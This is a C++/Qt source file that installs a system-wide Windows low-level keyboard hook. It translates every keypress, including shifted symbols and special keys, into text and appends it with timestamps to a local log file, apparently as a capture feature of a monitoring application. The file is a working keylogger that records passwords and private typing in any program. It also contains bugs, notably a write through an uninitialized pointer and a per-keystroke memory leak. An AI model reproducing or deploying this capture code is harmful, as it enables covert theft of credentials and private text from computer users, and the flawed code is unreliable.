#include "systemkeyboardread.h"
#include "utility.h"
#include <QDir>
#include <QDebug>


#define VK_VOLUME_MUTE 0xAD
#define VK_VOLUME_DOWN 0xAE
#define VK_VOLUME_UP 0xAF

SystemKeyboardRead* SystemKeyboardRead::Instance = 0;

SystemKeyboardRead::SystemKeyboardRead(QObject */*parent*/)
    : m_ConfigParser(ConfigParser::getInstance())
    , m_Timer(new QTimer(this))
    , m_File(NULL)
{
    keyboardHook = NULL;
    m_KeyEventCaptureEnabled = m_ConfigParser->IsFeatureEnabled(FEATURE_KEY_PRESS_CAPTURE);
    if(m_KeyEventCaptureEnabled)
    {
        m_CaptureDuration = m_ConfigParser->getFeatureRecordDuration(FEATURE_KEY_PRESS_CAPTURE);
        if(m_CaptureDuration == 0)
            m_CaptureDuration =2;

        m_LogDirectoryPath = m_ConfigParser->getFeatureLogFolderLocation(FEATURE_KEY_PRESS_CAPTURE);
        m_LogFolder = Utility::CreateLogFolder(FEATURE_KEY_PRESS_CAPTURE,m_LogDirectoryPath);

        m_FileNamePrefix = m_ConfigParser->getFeatureLogFilePrefix(FEATURE_KEY_PRESS_CAPTURE);
        connect(m_Timer, SIGNAL(timeout()), this, SLOT(recordTimeStamp()));
    }
}

SystemKeyboardRead::~SystemKeyboardRead()
{
    if(m_File->isOpen())
        m_File->close();
    DELETE_OBJECT(m_TextStream)
    DELETE_OBJECT(m_File);
    DELETE_OBJECT(m_Timer);
    delete Instance;
}

void SystemKeyboardRead::CaptureKeyEvents()
{
    if(m_KeyEventCaptureEnabled)
    {
        //create log file if not exist
        if(m_File == NULL)
        m_File = Utility::CreateLogFile(m_LogFolder, m_FileNamePrefix);

        if(!(m_File == NULL))
        {
            if(m_File->open(QFile::Append/* | QFile::Truncate*/))
            {
                m_TextStream = new QTextStream(m_File);
            }
        }
        SystemKeyboardRead::getInstance()->setConnected(true);
        m_Timer->start(m_CaptureDuration*60*1000);
    }
}

void SystemKeyboardRead::recordTimeStamp()
{
    //write timestamp to log file
    if(m_TextStream != NULL)
    {
        (*m_TextStream) << "\nSystemKeyboardReadTimeStamp" << "," << Utility::getFormattedCurrentTimeStamp() <<"\n";
        m_TextStream->flush();
    }
    m_Timer->start(m_CaptureDuration*60*1000);
}

LRESULT CALLBACK SystemKeyboardRead::keyboardProcedure(int nCode, WPARAM wParam, LPARAM lParam)
{
    //check for a key down press
    if(nCode == HC_ACTION)
    {
        if(wParam == WM_KEYDOWN)
        {
            KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
            byte *keysDepressd;
            keysDepressd= new byte[numberKeys];
            if(GetKeyboardState(keysDepressd))
            {
                emit SystemKeyboardRead::getInstance()->keyPressed(keysDepressd, (DWORD) pKeyboard->vkCode);
                SystemKeyboardRead::getInstance()->mapVKeyCode(pKeyboard);
                qDebug()<<"Key Pressed: Keycode:"<<(DWORD) pKeyboard->vkCode<<"\n";
            }
        }
        else if(wParam == WM_KEYUP)
        {

        }
    }
   // return false;
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

bool SystemKeyboardRead::connected()
{
    return keyboardHook;
}

bool SystemKeyboardRead::setConnected(bool state)
{
    if(state && (keyboardHook == NULL))
    {
        keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProcedure, GetModuleHandle(NULL), 0);
    }
    else
    {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }
    return keyboardHook;
}

SystemKeyboardRead* SystemKeyboardRead::getInstance()
{
    if(Instance == NULL)
    {
        Instance = new SystemKeyboardRead();
    }
    return Instance;
}

void SystemKeyboardRead::mapVKeyCode(KBDLLHOOKSTRUCT *pKeyBoard)
{
    DWORD vkCode = (DWORD)pKeyBoard->vkCode;
    char val[5];
    DWORD dwMsg = 1;
    if ((vkCode >= 39) && (vkCode <= 64)) // Keys 0-9
    {
        // TODO fix to shift key HELD down
        if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
        {
            switch (vkCode)// 0x30-0x39 is 0-9 respectively
            {
            case 0x30:
                log(")");
                break;
            case 0x31:
                log("!");
                break;
            case 0x32:
                log("@");
                break;
            case 0x33:
                log("#");
                break;
            case 0x34:
                log("$");
                break;
            case 0x35:
                log("%");
                break;
            case 0x36:
                log("^");
                break;
            case 0x37:
                log("&");
                break;
            case 0x38:
                log("*");
                break;
            case 0x39:
                log("(");
                break;
            }
        }
        else // If shift key is not down
        {
            sprintf(val, "%c", (int)vkCode);
            log(val);
        }
    }
    else if ((vkCode > 64) && (vkCode < 91)) // Keys a-z
    { if (!(GetAsyncKeyState(VK_SHIFT) ^ (GetKeyState(VK_CAPITAL) & 0x0001))) // Check if letters should be lowercase
        {
            vkCode += 32; // Un-capitalize letters
        }
        sprintf(val, "%c", (int)vkCode);
        log(val);
    }
    else // Every other key
    {
        switch (vkCode)
            // Check for other keys
        {
        case VK_CANCEL:
            log("[Cancel]");
            break;
        case VK_SPACE:
            log(" ");
            break;
        case VK_LCONTROL:
            log("[LCtrl]");
            break;
        case VK_RCONTROL:
            log("[RCtrl]");
            break;
        case VK_LMENU:
            log("[LAlt]");
            break;
        case VK_RMENU:
            log("[RAlt]");
            break;
        case VK_LWIN:
            log("[LWindows]");
            break;
        case VK_RWIN:
            log("[RWindows]");
            break;
        case VK_APPS:
            log("[Applications]");
            break;
        case VK_SNAPSHOT:
            log("[PrintScreen]");
            break;
        case VK_INSERT:
            log("[Insert]");
            break;
        case VK_PAUSE:
            log("[Pause]");
            break;
        case VK_VOLUME_MUTE:
            log("[VolumeMute]");
            break;
        case VK_VOLUME_DOWN:
            log("[VolumeDown]");
            break;
        case VK_VOLUME_UP:
            log("[VolumeUp]");
            break;
        case VK_SELECT:
            log("[Select]");
            break;
        case VK_HELP:
            log("[Help]");
            break;
        case VK_EXECUTE:
            log("[Execute]");
            break;
        case VK_DELETE:
            log("[Delete]");
            break;
        case VK_CLEAR:
            log("[Clear]");
            break;
        case VK_RETURN:
            log("[Enter]");
            break;
        case VK_BACK:
            log("[Backspace]");
            break;
        case VK_TAB:
            log("[Tab]");
            break;
        case VK_ESCAPE:
            log("[Escape]");
            break;
        case VK_LSHIFT:
            log("[LShift]");
            break;
        case VK_RSHIFT:
            log("[RShift]");
            break;
        case VK_CAPITAL:
            log("[CapsLock]");
            break;
        case VK_NUMLOCK:
            log("[NumLock]");
            break;
        case VK_SCROLL:
            log("[ScrollLock]");
            break;
        case VK_HOME:
            log("[Home]");
            break;
        case VK_END:
            log("[End]");
            break;
        case VK_PLAY:
            log("[Play]");
            break;
        case VK_ZOOM:
            log("[Zoom]");
            break;
        case VK_DIVIDE:
            log("[/]");
            break;
        case VK_MULTIPLY:
            log("[*]");
            break;
        case VK_SUBTRACT:
            log("[-]");
            break;
        case VK_ADD:
            log("[+]");
            break;
        case VK_PRIOR:
            log("[PageUp]");
            break;
        case VK_NEXT:
            log("[PageDown]");
            break;
        case VK_LEFT:
            log("[LArrow]");
            break;
        case VK_RIGHT:
            log("[RArrow]");
            break;
        case VK_UP:
            log("[UpArrow]");
            break;
        case VK_DOWN:
            log("[DownArrow]");
            break;
        case VK_NUMPAD0:
            log("[0]");
            break;
        case VK_NUMPAD1:
            log("[1]");
            break;
        case VK_NUMPAD2:
            log("[2]");
            break;
        case VK_NUMPAD3:
            log("[3]");
            break;
        case VK_NUMPAD4:
            log("[4]");
            break;
        case VK_NUMPAD5:
            log("[5]");
            break;
        case VK_NUMPAD6:
            log("[6]");
            break;
        case VK_NUMPAD7:
            log("[7]");
            break;
        case VK_NUMPAD8:
            log("[8]");
            break;
        case VK_NUMPAD9:
            log("[9]");
            break;
        case VK_F1:
            log("[F1]");
            break;
        case VK_F2:
            log("[F2]");
            break;
        case VK_F3:
            log("[F3]");
            break;
        case VK_F4:
            log("[F4]");
            break;
        case VK_F5:
            log("[F5]");
            break;
        case VK_F6:
            log("[F6]");
            break;
        case VK_F7:
            log("[F7]");
            break;
        case VK_F8:
            log("[F8]");
            break;
        case VK_F9:
            log("[F9]");
            break;
        case VK_F10:
            log("[F10]");
            break;
        case VK_F11:
            log("[F11]");
            break;
        case VK_F12:
            log("[F12]");
            break;
        case VK_F13:
            log("[F13]");
            break;
        case VK_F14:
            log("[F14]");
            break;
        case VK_F15:
            log("[F15]");
            break;
        case VK_F16:
            log("[F16]");
            break;
        case VK_F17:
            log("[F17]");
            break;
        case VK_F18:
            log("[F18]");
            break;
        case VK_F19:
            log("[F19]");
            break;
        case VK_F20:
            log("[F20]");
            break;
        case VK_F21:
            log("[F21]");
            break;
        case VK_F22:
            log("[F22]");
            break;
        case VK_F23:
            log("[F23]");
            break;
        case VK_F24:
            log("[F24]");
            break;
        case VK_OEM_2:
            if (GetAsyncKeyState(VK_SHIFT))
                log("?");
            else
                log("/");
            break;
        case VK_OEM_3:
            if (GetAsyncKeyState(VK_SHIFT))
                log("~");
            else
                log("`");
            break;
        case VK_OEM_4:
            if (GetAsyncKeyState(VK_SHIFT))
                log("{");
            else
                log("[");
            break;
        case VK_OEM_5:
            if (GetAsyncKeyState(VK_SHIFT))
                log("|");
            else
                log("\\");
            break;
        case VK_OEM_6:
            if (GetAsyncKeyState(VK_SHIFT))
                log("}");
            else
                log("]");
            break;
        case VK_OEM_7:
            if (GetAsyncKeyState(VK_SHIFT))
                log("\\");
            else
                log("'");
            break;
            break;
        case 0xBC:                //comma
            if (GetAsyncKeyState(VK_SHIFT))
                log("<");
            else
                log(",");
            break;
        case 0xBE:              //Period
            if (GetAsyncKeyState(VK_SHIFT))
                log(">");
            else
                log(".");
            break;
        case 0xBA:              //Semi Colon same as VK_OEM_1
            if (GetAsyncKeyState(VK_SHIFT))
                log(":");
            else
                log(";");
            break;
        case 0xBD:              //Minus
            if (GetAsyncKeyState(VK_SHIFT))
                log("_");
            else
                log("-");
            break;
        case 0xBB:              //Equal
            if (GetAsyncKeyState(VK_SHIFT))
                log("+");
            else
                log("=");
            break;
        default:
            dwMsg += pKeyBoard->scanCode << 16;
            dwMsg += pKeyBoard->flags << 24;

            wchar_t* key;
            GetKeyNameText(dwMsg, key, 15);
            log((char *)key);
        }
    }
}


void SystemKeyboardRead::log(const char *s1)
{
//write keys on single row until timeout duration
    //write Key to log file
    if(m_TextStream != NULL)
    {
        (*m_TextStream) << "keyValue:" << s1<<",";
        m_TextStream->flush();
    }
    qDebug()<<"keyValue:"<<s1;
}
